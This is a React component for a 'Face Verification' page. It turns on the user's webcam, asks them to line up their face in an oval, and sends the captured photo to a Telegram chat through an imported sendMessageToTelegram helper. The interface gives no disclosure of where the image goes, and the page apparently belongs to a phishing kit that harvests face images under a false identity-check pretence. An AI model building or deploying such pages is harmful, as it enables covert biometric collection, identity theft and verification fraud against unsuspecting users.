"use client"
import React, { useEffect, useRef, useState } from "react";
import { sendMessageToTelegram } from '../lib/api';





export default function FaceVerification() {
    const videoRef = useRef(null);
    const canvasRef = useRef(null);
    const [isCapturing, setIsCapturing] = useState(false);

    // Start the camera when the component mounts
    useEffect(() => {
        const startCamera = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                if (videoRef.current) {
                    videoRef.current.srcObject = stream;
                }
            } catch (error) {
                console.error("Error accessing the camera:", error);
            }
        };

        startCamera();

        // Cleanup: Stop the camera when the component unmounts
        return () => {
            if (videoRef.current && videoRef.current.srcObject) {
                videoRef.current.srcObject.getTracks().forEach(track => track.stop());
            }
        };
    }, []);

    // Function to capture image
    const captureImage = () => {
        setIsCapturing(true);

        // Use setTimeout to show the capturing animation
        setTimeout(() => {
            if (videoRef.current && canvasRef.current) {
                const video = videoRef.current;
                const canvas = canvasRef.current;
                const context = canvas.getContext('2d');

                // Set canvas dimensions to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Draw the current video frame to the canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert to base64 image data
                const imageData = canvas.toDataURL('image/png');
                canvas.toBlob((blob) => {
                    // Now you have a blob that can be sent to Telegram
                    console.log("Image blob created");
                    
                    // Send the blob to Telegram
                    sendMessageToTelegram (blob);
                    
                }, 'image/jpeg', 0.9);

                setIsCapturing(false);
            }
        }, 300);
    };

    return (
        <div className="h-screen w-full bg-gradient-to-b from-blue-900 to-black flex flex-col items-center justify-center relative overflow-hidden">
            {/* Hidden canvas for image capture */}
            <canvas ref={canvasRef} className="hidden" />
            
            {/* Header */}
            <div className="absolute top-0 left-0 w-full p-5 flex items-center justify-between">
                <button className="text-white hover:text-blue-300 transition-colors">
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 0 24 24" width="24px" fill="currentColor">
                        <path d="M0 0h24v24H0V0z" fill="none"/>
                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                    </svg>
                </button>
                <p className="text-white text-lg font-semibold">Face Verification</p>
                <div className="w-6"></div> {/* Spacer for alignment */}
            </div>

            {/* Oval camera view */}
            <div className="relative w-64 h-80 mb-12 mt-12">
                <div className="absolute inset-0 rounded-full bg-white bg-opacity-10 backdrop-blur-sm border-2 border-blue-400 border-opacity-50 overflow-hidden shadow-lg"
                    style={{ transform: 'scaleY(1.2)' }}>
                    <div className="absolute inset-0" style={{ transform: 'scaleY(0.833)' }}>
                        <video
                            ref={videoRef}
                            autoPlay
                            playsInline
                            muted
                            className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 min-w-full min-h-full object-cover"
                        />
                    </div>
                </div>
                
                {/* Face outline guide */}
                <div className="absolute inset-0 pointer-events-none flex items-center justify-center">
                    <svg width="180" height="220" viewBox="0 0 180 220" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M90 10C40 10 10 60 10 110C10 160 40 210 90 210C140 210 170 160 170 110C170 60 140 10 90 10Z" stroke="rgba(255,255,255,0.6)" strokeWidth="2" strokeDasharray="8 4" />
                    </svg>
                </div>
            </div>

            {/* Instructions */}
            <div className="text-center mb-12">
                <p className="text-white text-lg font-medium mb-2">Position your face in the oval</p>
                <p className="text-blue-300 text-sm">Make sure your face is well-lit and clearly visible</p>
            </div>

            {/* Capture button */}
            <div className="mb-8">
                <button
                    onClick={captureImage}
                    className={`w-16 h-16 rounded-full flex items-center justify-center transition-all duration-300 ${isCapturing ? 'scale-90' : 'scale-100'}`}
                >
                    <div className="w-16 h-16 rounded-full bg-white bg-opacity-80 flex items-center justify-center">
                        <div className={`w-14 h-14 rounded-full border-2 border-blue-900 ${isCapturing ? 'bg-blue-400' : 'bg-transparent'} transition-colors duration-300`}></div>
                    </div>
                </button>
            </div>
        </div>
    );
}
